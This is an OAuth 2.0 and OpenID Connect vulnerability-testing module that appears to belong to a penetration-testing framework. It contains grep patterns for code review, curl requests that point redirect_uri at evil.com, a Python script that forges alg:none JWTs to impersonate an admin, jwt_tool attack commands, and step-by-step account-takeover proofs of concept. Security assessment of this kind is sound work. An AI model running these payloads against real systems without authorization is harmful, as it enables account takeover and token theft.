# VULN MODULE — OAuth 2.0 / OIDC
# Asset: webapp
# Append to asset/webapp/module.md when target implements OAuth 2.0 or OpenID Connect flows
# Report ID prefix: WEB-OAUTH

## THREAT MODEL

OAuth 2.0 and OIDC delegate authentication and authorization across trust boundaries.
Each hand-off in the flow — authorization request, code exchange, token issuance,
token validation — introduces an opportunity for manipulation:
- Authorization codes are short-lived but interceptable via redirect_uri manipulation
- State parameter is the only CSRF protection in the OAuth flow; absent or static state = CSRF
- redirect_uri validation is notoriously under-specified; partial matching enables open redirect chaining
- Tokens embedded in URL fragments leak via Referer headers, browser history, and proxy logs
- PKCE was designed to protect public clients; servers that allow downgrade to non-PKCE flows
  remain vulnerable to code interception
- OIDC ID token claims (email, sub) are trusted blindly by relying parties; claim confusion
  enables cross-account takeover when the provider allows multiple linked identities
- JWT signature algorithm confusion (alg:none, RS256→HS256) bypasses ID token verification

## VULNERABILITY CLASSES

1.  Authorization Code Interception via Open redirect_uri    CWE-601  — redirect to attacker domain leaks code
2.  Missing / Static State Parameter (CSRF)                 CWE-352  — OAuth CSRF allows forced account link
3.  Redirect URI Validation Bypass                          CWE-183  — partial match, path traversal, wildcard
4.  Token Leakage via Referer Header                        CWE-200  — access token in URL fragment/query string
5.  Implicit Flow Token Theft                               CWE-522  — fragment token accessible to inline scripts
6.  PKCE Downgrade Attack                                   CWE-757  — server accepts plain or no code_challenge
7.  Account Takeover via Email Claim Confusion              CWE-287  — unverified email from IdP trusted as identity
8.  Token Replay / Missing nonce Validation                 CWE-294  — replayed ID token accepted across sessions
9.  JWT alg:none / Algorithm Confusion in OIDC              CWE-347  — signature stripped or RS256 key used as HMAC
10. Insecure Token Storage (client-side)                    CWE-312  — tokens stored in localStorage / cookies without Secure/HttpOnly

## WHITEBOX STATIC ANALYSIS

```bash
# Locate OAuth / OIDC library usage
grep -rn "oauth\|OAuth\|passport\|openid-client\|oidc-provider\|authlib\|omniauth\|doorkeeper\|rack-oauth2" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.rb" --include="*.go"

# Find redirect_uri validation logic
grep -rn "redirect_uri\|redirectUri\|redirect_url\|callbackUrl" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.rb" -A5
# Flag: string contains(), startsWith(), endsWith() — all bypassable
# Flag: regex without anchors (^...$)
# Flag: no validation at all — check if value is passed directly to Location header

# State parameter generation and validation
grep -rn "state\b" --include="*.js" --include="*.ts" --include="*.py" --include="*.rb" -B2 -A5 | \
  grep -E "state|csrf|nonce"
# Flag: state is hardcoded, empty string, or not validated on callback
# Flag: state stored in localStorage instead of server-side session

# PKCE implementation
grep -rn "code_challenge\|code_verifier\|PKCE\|S256\|plain" \
  --include="*.js" --include="*.ts" --include="*.py" -A5
# Flag: code_challenge_method=plain allowed
# Flag: server does not require code_challenge when client is public

# Token endpoint and storage
grep -rn "access_token\|refresh_token\|id_token\|localStorage\|sessionStorage" \
  --include="*.js" --include="*.ts" -A3
# Flag: tokens stored in localStorage (XSS-accessible)
# Flag: tokens passed as query parameters (leaks via Referer/logs)

# ID token validation — algorithm enforcement
grep -rn "verify\|decode\|jwt\.verify\|jose\.verify\|PyJWT\|algorithms\b" \
  --include="*.js" --include="*.ts" --include="*.py" -A5
# Flag: algorithms not explicitly set (default = any)
# Flag: algorithm: 'none' accepted or no algorithm pinning
# Flag: RS256 public key also used with HS256 signing

# Email claim trust without verification flag
grep -rn "email_verified\|emailVerified" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.rb"
# Flag: email used for account lookup but email_verified not checked

# Nonce validation in OIDC
grep -rn "nonce" --include="*.js" --include="*.ts" --include="*.py" -A5
# Flag: nonce generated but not validated against ID token claim

# Token expiry and revocation
grep -rn "exp\b\|token.*expir\|revoke\|introspect" \
  --include="*.js" --include="*.ts" --include="*.py" -A3
# Flag: exp claim not checked on ID token
# Flag: no token revocation endpoint called on logout
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Enumerate OAuth endpoints and parameters
```bash
# Discover authorization endpoint and parameters
curl -si "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://target.com/callback&scope=openid+email+profile&state=TESTSTATE123"

# Check /.well-known/openid-configuration for OIDC metadata
curl -s "https://target.com/.well-known/openid-configuration" | python3 -m json.tool

# Check supported response types and grant types
# Look for: response_types_supported, grant_types_supported, code_challenge_methods_supported
```

### Step 2 — State parameter (OAuth CSRF) test
```bash
# Attempt 1: Drop state entirely
curl -si "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://target.com/callback&scope=openid"
# If redirects to IdP without error = state not required

# Attempt 2: Submit arbitrary state on callback — does server validate it?
# Intercept legitimate callback, change state value, replay
# e.g., change state=LEGIT to state=ATTACKER
# If accepted = state not validated = OAuth CSRF confirmed

# Attempt 3: Reuse state across sessions
# Complete one OAuth flow, capture state, attempt to reuse in new session
```

### Step 3 — redirect_uri manipulation
```bash
BASE="https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&scope=openid"

# Open redirect — external domain
curl -si "$BASE&redirect_uri=https://evil.com/callback&state=x"

# Path traversal bypass
curl -si "$BASE&redirect_uri=https://target.com/callback/../../../evil&state=x"

# Subdomain confusion
curl -si "$BASE&redirect_uri=https://target.com.evil.com/callback&state=x"

# URI fragment confusion
curl -si "$BASE&redirect_uri=https://target.com/callback%23.evil.com&state=x"

# Parameter pollution
curl -si "$BASE&redirect_uri=https://target.com/callback&redirect_uri=https://evil.com/cb&state=x"

# Wildcard subdomain (if regex-based validation)
curl -si "$BASE&redirect_uri=https://evil.target.com/callback&state=x"

# For each: check if Location header points to manipulated URI
```

### Step 4 — PKCE downgrade
```bash
# Test if server accepts authorization request with no code_challenge
curl -si "https://target.com/oauth/authorize?response_type=code&client_id=PUBLIC_CLIENT_ID&redirect_uri=https://target.com/callback&scope=openid&state=x"
# If code returned without code_challenge being required = PKCE not enforced

# Test if server accepts code_challenge_method=plain
curl -si "https://target.com/oauth/authorize?response_type=code&client_id=PUBLIC_CLIENT_ID&redirect_uri=https://target.com/callback&scope=openid&state=x&code_challenge=CHALLENGE_PLAIN&code_challenge_method=plain"

# Test code exchange without code_verifier (if code_challenge was sent)
curl -s -X POST "https://target.com/oauth/token" \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://target.com/callback&client_id=PUBLIC_CLIENT_ID"
# Omit code_verifier — if token returned = server doesn't enforce PKCE verification
```

### Step 5 — Token leakage via Referer
```bash
# Check if access token appears in URL query string (not just fragment)
# After authorization, check: does the callback URL contain access_token= as query param?
# Then navigate to external link — does Referer header contain the token?

# For implicit flow: access_token is in fragment — check if JS on page reads it and sends elsewhere
# Look for: window.location.hash, URLSearchParams, postMessage with token
```

### Step 6 — JWT alg:none and algorithm confusion
```python
import base64, json, requests

# Decode the ID token (no verification)
id_token = "eyJ....<paste_token_here>"
header_b64, payload_b64, sig = id_token.split(".")
padding = "=" * (4 - len(payload_b64) % 4)
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + padding))
print(payload)

# Craft alg:none token with modified sub/email
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
payload["email"] = "admin@target.com"
payload["sub"] = "admin-user-id"
body = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
forged = f"{header}.{body}."  # empty signature

# Submit forged token as Bearer or in id_token parameter
r = requests.get("https://target.com/api/me", headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.text)
```

### Step 7 — Email claim confusion / account takeover
```bash
# Scenario: target trusts email claim from third-party IdP without email_verified check
# 1. Register IdP account with email = victim@target.com (unverified)
# 2. Initiate OAuth flow with that IdP
# 3. Check if target.com matches your IdP account to victim's existing local account
# 4. If matched = ATO via unverified email claim

# Test with providers that allow unverified emails:
# - GitHub (primary email may be unverified)
# - Custom SAML/OIDC providers
# - Look for: does the app ask to "link" or silently merge accounts?
```

### Step 8 — Token replay / nonce test
```bash
# 1. Capture a valid ID token from a completed login flow
# 2. Attempt to replay it in a fresh session:
curl -s -X POST "https://target.com/auth/oidc/callback" \
  -d "id_token=CAPTURED_ID_TOKEN&state=CAPTURED_STATE"
# If accepted = nonce and iat/exp not validated properly

# Check nonce: if nonce in ID token payload matches a value bound to your session
# Replay attack works when: nonce not checked, or nonce stored globally rather than per-session
```

## DYNAMIC CONFIRMATION

### PoC: OAuth CSRF (forced account link)
```
1. Attacker authenticates with their own social account (attacker@evil.com)
2. Intercepts the OAuth callback URL (contains code= and state=)
3. Before submitting the callback, drops the state parameter or uses a known-static state
4. Sends the callback URL to a victim who is already logged in
5. Victim's browser processes the callback → victim's account is now linked to attacker's social identity
6. Attacker logs in via social account → authenticated as victim
Confirmation: two distinct sessions confirm different user IDs, same account.
```

### PoC: redirect_uri open redirect → code theft
```
1. Craft authorization URL with redirect_uri pointing to attacker-controlled domain
2. Send to victim (phishing, stored link)
3. Victim authenticates with IdP
4. IdP redirects to attacker domain with ?code=AUTH_CODE
5. Attacker exchanges code at token endpoint:
   POST /oauth/token
   grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://evil.com/cb&client_id=CLIENT_ID
6. Token returned → attacker authenticated as victim
Confirmation: token introspection or /api/me returns victim's identity.
```

### PoC: PKCE downgrade → authorization code interception
```
1. Confirm PKCE not enforced (Step 4 above)
2. Intercept authorization code in transit (network position or redirect_uri manipulation)
3. Exchange code without code_verifier:
   POST /oauth/token
   grant_type=authorization_code&code=INTERCEPTED&redirect_uri=...&client_id=...
4. Obtain access token without possessing the code_verifier the legitimate client generated
Confirmation: token returned and /api/me returns victim's identity.
```

## REPORT_BUNDLE FIELDS

```json
{
  "vulnerability_class": "OAuth 2.0 Misconfiguration",
  "cwe": "CWE-601 | CWE-352 | CWE-347",
  "affected_endpoint": "https://target.com/oauth/authorize",
  "affected_parameter": "redirect_uri | state | code_challenge",
  "evidence": {
    "request": "<full HTTP request>",
    "response": "<Location header or token response>",
    "poc_steps": "<numbered reproduction steps>",
    "session_proof": "<two account IDs confirming ATO>"
  },
  "impact": "Account takeover | CSRF forced link | Token theft",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
  "remediation": "Pin redirect_uri to exact registered values; enforce state validation server-side; require PKCE for all public clients; validate email_verified claim; pin JWT algorithm in verifier config"
}
```

## TOOLS

```bash
# oauth2c — CLI OAuth 2.0 client for testing flows
# https://github.com/cloudentity/oauth2c
oauth2c --issuer https://target.com \
  --client-id CLIENT_ID --client-secret SECRET \
  --response-types code --grant-type authorization_code \
  --scopes openid,email --redirect-url https://localhost/callback

# jwt_tool — JWT attack toolkit (alg confusion, alg:none, key confusion)
pip install jwt_tool
jwt_tool <TOKEN> -X a           # alg:none attack
jwt_tool <TOKEN> -X s           # RS256 → HS256 key confusion
jwt_tool <TOKEN> -I -pc email -pv "admin@target.com" -S hs256 -k public.pem

# oidcscan — OIDC security scanner
# https://github.com/danielfett/oidcscan

# Burp Suite — intercept and replay OAuth flows
# Extensions: OAuth Scanner (Portswigger), AuthMatrix
```
